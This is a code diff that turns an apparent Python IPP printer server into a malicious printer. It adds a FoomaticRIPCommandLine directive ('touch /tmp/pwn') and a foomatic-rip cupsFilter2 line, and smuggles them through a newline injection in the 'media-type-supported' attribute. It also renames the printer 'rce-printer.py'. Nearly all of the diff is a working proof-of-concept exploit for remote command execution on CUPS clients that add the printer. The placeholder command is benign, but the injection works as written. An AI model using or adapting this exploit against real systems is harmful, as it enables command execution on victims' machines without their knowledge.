@@ -1,0 +1,59 @@
+diff --git a/ippserver/behaviour.py b/ippserver/behaviour.py
+index edec9e9..3303456 100644
+--- a/ippserver/behaviour.py
++++ b/ippserver/behaviour.py
+@@ -21,6 +21,10 @@ from .ppd import BasicPostscriptPPD, BasicPdfPPD
+ from .request import IppRequest
+ 
+ 
++FOOMATIC_RIP='*FoomaticRIPCommandLine: touch /tmp/pwn; #'
++CUPS_FILTER='*cupsFilter2: "application/vnd.cups-pdf application/pdf 0 foomatic-rip"'
++
++
+ def get_job_id(req):
+     return Integer.from_bytes(
+             req.only(
+@@ -79,6 +83,7 @@ class AllCommandsReturnNotImplemented(Behaviour):
+ 
+     There's no real use for this, it's just an example.
+     """
++
+     def get_handle_command_function(self, _opid_or_status):
+         return self.operation_not_implemented_response
+ 
+@@ -235,7 +240,7 @@ class StatelessPrinter(Behaviour):
+                 SectionEnum.printer,
+                 b'printer-make-and-model',
+                 TagEnum.text_without_language
+-            ): [b'h2g2bob\'s ipp-printer.py 0.00'],
++            ): [b'rdjgr\'s rce-printer.py 0.00'],
+             (
+                 SectionEnum.printer,
+                 b'printer-state',
+@@ -324,6 +329,26 @@ class StatelessPrinter(Behaviour):
+                 b'compression-supported',
+                 TagEnum.keyword
+             ): [b'none'],
++            (
++                SectionEnum.printer,
++                b'media-default',
++                TagEnum.keyword
++            ): [b'iso_a4_210x297mm'],
++            (
++                SectionEnum.printer,
++                b'media-supported',
++                TagEnum.keyword
++            ): [b'iso_a4_210x297mm'],
++            (
++                SectionEnum.printer,
++                b'media-type',
++                TagEnum.keyword
++            ): [b'stationery'],
++            (
++                SectionEnum.printer,
++                b'media-type-supported',
++                TagEnum.keyword
++            ): [b'stationery', f': ONE\n{FOOMATIC_RIP}\n{CUPS_FILTER}\n*%'.encode()],
+         }
+         attr.update(self.minimal_attributes())
+         return attr
